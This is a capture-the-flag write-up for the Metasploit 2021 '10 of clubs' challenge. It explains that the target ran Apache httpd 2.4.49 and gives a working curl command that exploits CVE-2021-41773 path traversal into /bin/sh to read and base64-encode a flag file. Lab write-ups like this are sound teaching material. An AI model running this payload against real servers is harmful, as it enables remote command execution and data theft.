---
layout: load_md
title: The White Circle | Metasploit 2021 | 10 of clubs Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Metasploit 2021
parent: metasploit_2021
category: 10_of_clubs
challenge: 10 of clubs
tags: "web, starry, cve, rce"
---

<h1 class="heading card-title white-text">Metasploit 2021</h1>
## 10 of clubs

> Solved by: Starry-Lord

```
port 12380
```

This port was using Apache httpd 2.4.49 and I found a good research on the subject here:

https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013


I didn't need to get a shell. ls and cat commands were enough to extract the png:


```
curl -vv 'http://172.17.15.117:12380/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo; cat ../secret/safe/flag.png|base64'
```

![](https://i.imgur.com/aYyIBok.png)